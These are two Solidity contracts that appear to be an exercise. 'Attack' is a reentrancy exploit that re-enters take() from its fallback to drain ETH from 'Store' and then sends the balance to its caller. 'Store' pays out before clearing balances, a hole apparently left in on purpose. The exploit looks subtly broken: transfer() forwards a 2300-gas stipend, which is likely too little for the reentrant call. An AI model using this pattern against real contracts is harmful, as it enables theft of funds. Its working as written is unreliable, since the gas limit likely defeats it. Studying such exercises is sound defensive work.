// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;
import "ex1.sol";

contract Attack {
  Store public store;
  uint public attackValue;

  // intialize the Store variable with the contract address
  constructor(address _storeAddress, uint _attackValue) public {
      store = Store(_storeAddress);
      attackValue = _attackValue;
  }

  function attackStore() external payable {

      // send eth to the store() function
      store.store.value(attackValue)();

      // start the magic
      store.take();
  }

  function collectEther() public {
    msg.sender.transfer(address(this).balance);
  }

  // fallback function - where the magic happens
    receive () external payable {
        if (address(store).balance > attackValue) {
            store.take();
        }
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

contract Store {
    struct Safe {
        address owner;
        uint amount;
    }
    
    Safe[] public safes;
    
    /// @dev Store some ETH.
    function store() public payable {
        safes.push(Safe({owner: msg.sender, amount: msg.value}));
    }
    
    /// @dev Take back all the amount stored.
    function take() public {
        for (uint i; i<safes.length; ++i) {
            Safe storage safe = safes[i];
            if (safe.owner==msg.sender && safe.amount!=0) {
                payable(msg.sender).transfer(safe.amount);
                safe.amount=0;
            }
        }
        
    }
}